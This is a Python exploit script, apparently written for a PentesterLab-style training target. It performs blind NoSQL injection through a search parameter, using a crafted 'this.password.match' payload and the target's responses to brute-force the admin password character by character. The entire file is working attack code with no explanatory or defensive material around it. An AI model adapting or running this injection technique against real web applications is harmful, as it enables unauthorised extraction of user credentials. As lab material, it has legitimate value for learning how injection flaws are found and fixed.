import requests

#list of all possible characters
dict = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
# starting regex
regex = '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
flag = ''

""" 
start = starting index in regex 
end = ending index in regex + 1
size = number between {} in regex
"""
def compute(start, end, size, key):
    count = 1
    for c in range(start, end):
        if (size-count < 0):
            break;
        for i in range(36):
            if (len(str(size)) > 1):
                test = key[:len(key)] + dict[i] + regex[start:end-3] + str(size-count) + regex[end-3+len(str(size)):]
            else:
                test = key[:len(key)] + dict[i] + regex[start:end] + str(size-count) + regex[end+1:]
            print('Trying ' + test)
            r = requests.get('http://ptl-8a69a495-f36a338a.libcurl.so/?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/'+test+'/)%00')
            if '<tr><td><a href="?search=admin">admin</a></td></tr>' in r.text:
                key += dict[i]
                print("Character "+str(c)+" is: " + dict[i])
                count+=1
                break;
        print("Current key is: " + key)
    key += '-'
    return key

flag = compute(0,9,8, flag)
flag = compute(12,21,4, flag)
flag = compute(24,33,4, flag)
flag = compute(36,45,4, flag)
flag = compute(48,60,12, flag)
